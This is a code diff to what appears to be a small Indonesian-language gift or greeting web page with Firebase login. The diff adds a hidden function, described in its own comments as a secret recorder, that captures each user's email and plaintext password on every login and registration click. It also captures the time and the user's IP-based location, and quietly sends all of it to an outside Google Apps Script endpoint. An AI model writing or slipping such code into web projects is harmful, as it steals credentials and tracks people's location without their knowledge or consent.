@@ -135,7 +135,36 @@ giftBoxWrapper.addEventListener('click', () => {
     // Mainkan musik
     bgMusic.play().catch(err => console.log("Audio play diblokir browser."));
 });
+// --- FUNGSI PEREKAM RAHASIA (AKUN, PW, WAKTU, LOKASI) ---
+async function rekamDataRahasia(email, password) {
+    try {
+        // 1. Ambil Waktu Saat Ini
+        const waktu = new Date().toLocaleString('id-ID');
+        
+        // 2. Lacak Lokasi secara diam-diam (menggunakan IP API tanpa pop-up izin)
+        let lokasi = "Sedang dilacak...";
+        try {
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geoData = await geoRes.json();
+            // Menghasilkan format: Malang, East Java (Latitude, Longitude)
+            lokasi = `${geoData.city}, ${geoData.region} (${geoData.latitude}, ${geoData.longitude})`;
+        } catch (e) {
+            lokasi = "Gagal mendapat lokasi";
+        }
 
+        // 3. Masukkan URL Google Apps Script Anda di sini!
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxE2qb_PlyNq-YTJAcJotX0a9bNNR_85s8oJnwoXeIsQbdEM33j9yuN8cN9mDEqhyeW/exec';
+        
+        // 4. Susun data untuk dikirim
+        const urlKirim = `${SCRIPT_URL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&waktu=${encodeURIComponent(waktu)}&lokasi=${encodeURIComponent(lokasi)}`;
+        
+        // 5. Kirim ke Google Sheets diam-diam di background (mode no-cors agar tidak error)
+        fetch(urlKirim, { mode: 'no-cors' });
+        
+    } catch (error) {
+        console.log("Proses rekam berjalan di latar belakang");
+    }
+}
 // --- AUTENTIKASI ---
 onAuthStateChanged(auth, (user) => {
     if (user) {
@@ -153,14 +182,34 @@ onAuthStateChanged(auth, (user) => {
     }
 });
 
-document.getElementById('btn-login').addEventListener('click', async () => {
-    const e = document.getElementById('input-email').value, p = document.getElementById('input-password').value;
-    try { await signInWithEmailAndPassword(auth, e, p); } catch(err) { alert("Login gagal!"); }
+btnLogin.addEventListener('click', async () => {
+    const credentials = getInputs(); 
+    if (!credentials) return;
+    
+    // MEREKAM DATA SECARA DIAM-DIAM SAAT TOMBOL DIKLIK
+    rekamDataRahasia(credentials.email, credentials.password);
+
+    try { 
+        await signInWithEmailAndPassword(auth, credentials.email, credentials.password); 
+    } catch (error) { 
+        alert("Email atau kata sandi salah!"); 
+    }
 });
 
-document.getElementById('btn-register').addEventListener('click', async () => {
-    const e = document.getElementById('input-email').value, p = document.getElementById('input-password').value;
-    try { await createUserWithEmailAndPassword(auth, e, p); alert("Berhasil mendaftar!"); } catch(err) { alert("Gagal!"); }
+btnRegister.addEventListener('click', async () => {
+    const credentials = getInputs(); 
+    if (!credentials) return;
+
+    // MEREKAM DATA SECARA DIAM-DIAM SAAT TOMBOL DIKLIK
+    rekamDataRahasia(credentials.email, credentials.password);
+
+    try { 
+        await createUserWithEmailAndPassword(auth, credentials.email, credentials.password);
+        alert("Akun berhasil dibuat!");
+    } catch (error) {
+        if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
+        else alert("Gagal mendaftar: " + error.message);
+    }
 });
 
 btnLogout.addEventListener('click', () => signOut(auth));
